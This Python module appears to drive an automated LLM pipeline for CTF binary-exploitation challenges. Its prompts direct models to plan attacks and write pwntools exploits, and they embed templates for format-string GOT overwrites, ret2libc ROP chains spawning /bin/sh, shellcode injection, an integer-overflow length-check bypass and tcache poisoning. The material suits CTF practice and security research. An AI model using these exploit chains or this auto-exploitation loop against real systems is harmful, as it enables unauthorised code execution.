from __future__ import annotations

import json
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple

from automation.llm_client import LLMClientError, ROLE_PLANNER, chat_complete_detailed
from automation.schemas import Evidence, MeasurementRequest, PlannerPlan

PLANNER_SYSTEM_PROMPT = """You are the planner LLM for binary exploitation.
You do NOT write probe scripts in this role.
You must:
1) Read challenge/evidence/failure signals.
2) Propose an exploit strategy and a numbered list of required measurements.
3) Return strict JSON only.

JSON schema:
{
  "strategy_summary": "string",
  "vulnerability_logic": "string",
  "exploit_primitives": ["Leak_Libc", "Calculate_Base", "Overwrite_GOT"],
  "measurements": [
    {"id":1, "description":"用自然语言描述要测什么", "reason":"为什么要测", "priority":"high|medium|low"}
  ],
  "exploit_constraints": {"k":"v"},
  "need_more_measurements": true,
  "notes": ["..."]
}
Rules:
- NEVER use internal field names like offsets.xxx / symbols.xxx / probe_artifacts.xxx.
- Use only numbered natural-language measurement items.
- Never fabricate measured values in this step.
- Keep list focused (<= 12 measurements).
- PRIORITY RULE: If hint contains `DECIDER_MANDATORY` and describes a code bug (BINARY_AS_LIBC,
  KeyError, NameError, wrong symbol, missing import, wrong API, ModuleNotFoundError), the root
  cause is in the exploit CODE, not in missing measurements. In this case:
    * Set need_more_measurements = false (no new measurements needed — the facts are sufficient)
    * In notes, write "DECIDER_DIAGNOSED_CODE_BUG: let exploit writer fix code per decider instruction"
    * The exploit writer will receive the decider's specific code fix instructions
  Only request new measurements when the decider explicitly says a measured VALUE is missing
  (e.g., "ret_offset_bytes not measured", "fmt offset unknown").
- If hint contains `DECIDER_MANDATORY`, it is a hard directive and MUST be followed with highest priority.
- You will receive executor_feedback with unresolved_facts. If the same tool keeps failing,
  propose a DIFFERENT measurement approach rather than repeating the failed tool.
- You MUST follow a 3-step reasoning process (write it inside vulnerability_logic):
  1) Vulnerability identification (from C source + evidence)
  2) Exploit primitives design (logical chain, no code)
  3) Measurement requirements (what executor must measure and why)

CHALLENGE TYPE PATTERNS:
- fmt (format string):
  * Vulnerability: user-controlled printf format string.
  * Common goals: overwrite global var to pass check, overwrite GOT to hijack control flow.
  * Key primitives: FmtStr(exec_fmt) to measure offset, fmtstr_payload(offset, {addr: value}) to craft payload.
  * Measurement priority: (1) format string offset, (2) target address, (3) IO prompts for sync.
  * If FmtStr tool fails, use manual AAAA%i$p scan to find offset.

- rop (return-oriented programming):
  * Vulnerability: stack buffer overflow.
  * Common goals: ret2text (jump to win func), ret2libc (leak libc then system("/bin/sh")).
  * Key primitives: cyclic pattern to find ret offset, ROPgadget or built-in gadgets.
  * Measurement priority: (1) offset to ret addr, (2) useful gadget addresses, (3) pointer width.

- int (integer overflow):
  * Vulnerability: integer overflow leading to buffer overflow.
  * Common goals: overflow to overwrite ret addr with win/shellcode address.
  * Measurement priority: (1) offset to ret addr, (2) pointer width, (3) crash proof.

- heap (heap exploitation):
  * Vulnerability: UAF, double free, heap overflow.
  * Common goals: tcache poisoning, fastbin attack.
  * Measurement priority: (1) heap menu interaction model, (2) heap primitive type, (3) allocation trace.
"""

_EXPLOIT_WRITER_COMMON = """You are the planner LLM exploit writer.
Write a complete pwntools Python exploit based on measured facts and strategy.
Rules:
1) Use only measured facts from evidence/fact_store.
2) Must use absolute path from evidence.binary.path.
3) Add stage markers: print("[STAGE] exploit_start") / print("[STAGE] before_interactive").
4) Avoid unbounded recv/recvall without timeout.
5) Do not embed shell verification logic (`echo __PWNED__`, `id`, `pwd`).
6) Output only Python code.
7) If hint contains DECIDER_MANDATORY it is mandatory. Follow the next_action exactly.
8) If hint contains a CODE_FIX section, apply those specific code changes.
9) Load libc from evidence.runtime.libc_path. NEVER use the binary path as libc.
10) Use binary.got['X'] / binary.plt['X'] / binary.symbols['X']. NEVER hardcode 0x addresses.
11) Use sendlineafter() with exact prompt text from evidence.io_prompts for IO sync."""

_EXPLOIT_WRITER_FMT = """
=== FMT ===
思路1 覆写全局变量: payload = fmtstr_payload(OFFSET, {addr_of_var: target_value})
思路2 覆写GOT劫持控制流 (仅RELRO!=full): payload = fmtstr_payload(OFFSET, {binary.got['printf']: libc.symbols['system']})
  若目标是binary自身的win/backdoor函数: payload = fmtstr_payload(OFFSET, {binary.got['printf']: binary.symbols['backdoor']})
思路3 信息泄露 (%s读任意地址): 先用 p64(got_addr) + b"%N$s" 泄露libc地址, 再用思路2覆写GOT
  例: payload = p64(binary.got['puts']) + b"%7$s"; io.sendline(payload); leaked = u64(io.recv(6).ljust(8,b'\\x00'))
思路4 Full RELRO时GOT只读: 改为覆写栈上返回地址 / .fini_array / __malloc_hook
  先泄露libc基址(思路3), 再计算栈上返回地址位置并覆写为system或one_gadget
注意: 64-bit前6个参数在寄存器, fmt offset从栈上第7个开始, offset>=6."""

_EXPLOIT_WRITER_ROP = """
=== ROP ===
!!! 32-bit cdecl 铁律 — 每个函数调用必须在函数地址后插入假返回地址 !!!
  错误: p32(call_me_with_two_args) + p32(arg1) + p32(arg2)
         ↑ arg1 被当作返回地址，函数返回到 arg1(一个数字)→ SIGSEGV
  正确: p32(call_me_with_two_args) + p32(0x41414141) + p32(arg1) + p32(arg2)
                              ↑ 假返回地址占位，函数返回后才读取 arg1
  使用 rop.call(func_addr, [arg1, arg2]) 自动处理，不需要手动加。
  NEVER do 'rop.raw(arg1); rop.raw(arg2); rop.call(func)' — wrong order!
  正确: rop.call(func_addr, [arg1, arg2])  # pwntools handles cdecl for you

思路1 ret2text: payload = b"A" * OFFSET + p32/p64(win_addr)
思路2 ret2libc 32-bit:
  libc = ELF("/lib32/libc.so.6")
  # leak: p32(write_plt) + p32(main) + p32(1) + p32(write_got) + p32(4)
  # shell: p32(system) + p32(0x41414141) + p32(binsh)
思路3 ret2libc 64-bit (MUST use pop_rdi for arg passing):
  libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
  rop = ROP(context.binary)
  # leak: p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
  # shell: p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
思路4 ret2shellcode (NX disabled): shellcode = asm(shellcraft.sh()); payload = shellcode.ljust(OFFSET, b'A') + p64(buf_addr)"""

_EXPLOIT_WRITER_INT = """
=== INT ===
思路1 简单整数溢出: io.sendline(str(-1)); payload = b"A" * OFFSET + p32(target_addr)
思路2 uint8 strlen()截断 — 发送>255字节使strlen()%256绕过长度检查:
  场景: 代码中 unsigned __int8 len = strlen(input); if (len <= LOW || len > HIGH) fail;
  由于len是uint8, strlen>255时截断: 实际len = strlen % 256.
  绕过方法: 选择payload总长N使 N%256 落在 (LOW, HIGH] 区间内, 同时N>OFFSET保证溢出.
  payload = b"A" * OFFSET + p32(target_addr)
  payload += b"B" * (N - len(payload))  # 补齐到选定的N
  io.sendline(payload)"""

_EXPLOIT_WRITER_HEAP = """
=== HEAP ===
思路1 UAF: free后仍使用指针，覆盖已释放chunk。
思路2 tcache poisoning: 修改tcache的next指针指向目标地址。
具体交互逻辑取决于题目菜单，使用sendlineafter匹配提示符。"""

_EXPLOIT_WRITER_SECTIONS: dict[str, str] = {
    "fmt": _EXPLOIT_WRITER_FMT,
    "rop": _EXPLOIT_WRITER_ROP,
    "int": _EXPLOIT_WRITER_INT,
    "heap": _EXPLOIT_WRITER_HEAP,
}


def _build_exploit_writer_prompt(challenge_type: str) -> str:
    return _EXPLOIT_WRITER_COMMON + _EXPLOIT_WRITER_SECTIONS.get(challenge_type, "")


def _extract_json_block(raw: str) -> Dict[str, Any]:
    text = (raw or "").strip()
    try:
        return json.loads(text)
    except Exception:
        pass
    start = text.find("{")
    end = text.rfind("}")
    if start >= 0 and end > start:
        return json.loads(text[start : end + 1])
    raise ValueError("planner response does not contain valid JSON object")


def _default_measurements(challenge_type: str) -> List[MeasurementRequest]:
    if challenge_type == "fmt":
        return [
            MeasurementRequest(1, "确认格式化字符串写入时应使用的参数位置", "这是构造写入 payload 的关键前提", "high"),
            MeasurementRequest(2, "确认需要被改写的目标地址是多少", "需要把目标值写入正确位置", "high"),
            MeasurementRequest(3, "确认程序是否存在固定输入提示以及提示文本", "判断是否需要同步交互", "medium"),
        ]
    if challenge_type == "int":
        return [
            MeasurementRequest(1, "确认覆盖返回地址前需要填充的字节数", "这是构造控制流劫持 payload 的前提", "high"),
            MeasurementRequest(2, "确认目标程序的指针宽度和体系结构位数", "决定地址打包方式", "high"),
            MeasurementRequest(3, "确认崩溃时覆盖返回地址的证据", "验证偏移是否正确", "medium"),
        ]
    if challenge_type == "rop":
        return [
            MeasurementRequest(1, "确认覆盖返回地址前需要填充的字节数", "这是构造 ROP 链的前提", "high"),
            MeasurementRequest(2, "确认可用的关键 gadget 和调用原语", "决定 ROP 链如何搭建", "high"),
            MeasurementRequest(3, "确认目标程序的指针宽度和体系结构位数", "决定地址打包方式", "medium"),
        ]
    if challenge_type == "heap":
        return [
            MeasurementRequest(1, "确认堆题菜单的交互顺序和各输入含义", "需要正确驱动程序进入目标状态", "high"),
            MeasurementRequest(2, "确认堆漏洞原语属于哪一类", "决定利用路线", "high"),
            MeasurementRequest(3, "确认关键堆操作的运行轨迹", "判断分配释放行为是否符合预期", "medium"),
        ]
    return [MeasurementRequest(1, "确认当前题目最关键的可利用测量信息", "为后续生成利用提供依据", "high")]


def propose_strategy_and_requirements(
    evidence: Evidence,
    *,
    fact_store: Dict[str, Any],
    last_verify: Optional[Dict[str, Any]] = None,
    hint: str = "",
    log_event: Optional[Callable[[str, Dict[str, Any]], None]] = None,
    executor_feedback: Optional[Dict[str, Any]] = None,
) -> PlannerPlan:
    p = Path(evidence.problem_path)
    problem_text = p.read_text(encoding="utf-8", errors="ignore")[:12000] if p.exists() else ""
    prompt = {
        "challenge_type": evidence.challenge_type,
        "problem_text": problem_text,
        "evidence": evidence.to_trimmed_dict(),
        "fact_store": fact_store,
        "last_verify": last_verify or {},
        "hint": hint,
        "default_measurements": [x.__dict__ for x in _default_measurements(evidence.challenge_type)],
        "executor_feedback": executor_feedback or {},
    }
    if log_event:
        log_event("planner_request", {"prompt_preview": json.dumps(prompt, ensure_ascii=False)[:4000]})
    try:
        res = chat_complete_detailed(
            json.dumps(prompt, ensure_ascii=False),
            PLANNER_SYSTEM_PROMPT,
            temperature=0.1,
            role=ROLE_PLANNER,
        )
        data = _extract_json_block(res.raw_content)
        plan = PlannerPlan.from_dict(data)
        if log_event:
            log_event(
                "planner_response",
                {
                    "model": res.model,
                    "raw_preview": res.raw_content[:3000],
                    "measurement_count": len(plan.measurements),
                    "need_more_measurements": plan.need_more_measurements,
                },
            )
        return plan
    except (LLMClientError, ValueError, json.JSONDecodeError) as exc:
        # Safe fallback to deterministic minimal plan.
        return PlannerPlan.from_dict(
            {
                "strategy_summary": f"fallback_plan:{evidence.challenge_type}",
                "measurements": [x.__dict__ for x in _default_measurements(evidence.challenge_type)],
                "exploit_constraints": {},
                "need_more_measurements": True,
                "notes": [f"planner_fallback:{exc}"],
            }
        )


def generate_exploit_with_plan(
    evidence: Evidence,
    *,
    plan: PlannerPlan,
    fact_store: Dict[str, Any],
    hint: str = "",
    previous_code: str = "",
    static_audit: Optional[Dict[str, Any]] = None,
    log_event: Optional[Callable[[str, Dict[str, Any]], None]] = None,
) -> Tuple[str, str]:
    prompt_obj = {
        "strategy_summary": plan.strategy_summary,
        "plan_notes": plan.notes,
        "exploit_constraints": plan.exploit_constraints,
        "fact_store": fact_store,
        "evidence": evidence.to_trimmed_dict(),
        "hint": hint,
    }
    if log_event:
        log_event("exploit_generation_request", {"prompt_preview": json.dumps(prompt_obj, ensure_ascii=False)[:4000]})
    try:
        res = chat_complete_detailed(
            json.dumps(prompt_obj, ensure_ascii=False),
            _build_exploit_writer_prompt(evidence.challenge_type),
            temperature=0.1,
            role=ROLE_PLANNER,
        )
        if log_event:
            log_event(
                "exploit_generation_response",
                {"model": res.model, "raw_preview": res.raw_content[:3000], "code_preview": res.extracted_content[:3000]},
            )
        return res.extracted_content, res.model
    except LLMClientError as exc:
        if log_event:
            log_event("exploit_generation_error", {"error": str(exc)})
        return 'from pwn import *\nprint("[STAGE] exploit_start")\n', "fallback"


EXPLOIT_FIXER_SYSTEM_PROMPT = """Fix the provided pwntools exploit code according to the decider diagnosis. Output only the corrected Python code, no explanation. If STRATEGY ERROR is indicated, you may significantly restructure the exploit approach — do not just make minor fixes."""


def fix_exploit_code_with_feedback(
    previous_code: str,
    decider_failure: str,
    decider_next_action: str,
    *,
    decider_notes: Optional[List[str]] = None,
    critical_fixes: Optional[List[str]] = None,
    log_event: Optional[Callable[[str, Dict[str, Any]], None]] = None,
) -> Tuple[str, str]:
    notes = decider_notes or []
    fixes = critical_fixes or []

    # === Build the TOP section: !!! CRITICAL FIXES (first thing LLM sees) ===
    top_lines: list[str] = []
    if fixes:
        top_lines.append("!!! CRITICAL FIXES — APPLY THESE EXACT CHANGES TO THE CODE BELOW !!!")
        for i, fix in enumerate(fixes, 1):
            top_lines.append(f"  FIX {i}: {fix}")
        top_lines.append("")

    # Strategy mismatch
    strategy_mismatch = any("strategy=MISMATCH" in n or "strategy=PARTIAL" in n for n in notes)
    if strategy_mismatch and not fixes:
        top_lines.append(
            "!!! STRATEGY ERROR DETECTED !!!\n"
            "The current exploitation strategy is WRONG for this binary. "
            "You MUST switch to a DIFFERENT approach. "
            "Do NOT make minor fixes to the existing approach — change the strategy entirely.\n"
        )

    # Build diagnosis
    diagnosis_parts = [
        f"failure: {decider_failure}",
        f"next_action: {decider_next_action}",
    ]
    if notes:
        diagnosis_parts.append(f"additional_notes: {'; '.join(notes)}")
    diagnosis_text = "\n\n".join(diagnosis_parts)

    # === New prompt order: FIXES first → DIAGNOSIS → CODE last ===
    user_prompt = (
        (("\n".join(top_lines) + "\n\n") if top_lines else "") +
        "=== DECIDER DIAGNOSIS ===\n"
        f"{diagnosis_text}\n\n"
        "=== CODE TO FIX ===\n"
        f"```python\n{previous_code}\n```\n"
    )
    if log_event:
        log_event("exploit_fixer_request", {"prompt_preview": user_prompt[:2000]})
    try:
        res = chat_complete_detailed(
            user_prompt,
            EXPLOIT_FIXER_SYSTEM_PROMPT,
            temperature=0.1,
            role=ROLE_PLANNER,
        )
        if log_event:
            log_event(
                "exploit_fixer_response",
                {"model": res.model, "code_preview": res.extracted_content[:3000]},
            )
        return res.extracted_content, res.model
    except LLMClientError as exc:
        if log_event:
            log_event("exploit_fixer_error", {"error": str(exc)})
        return previous_code, "fallback"
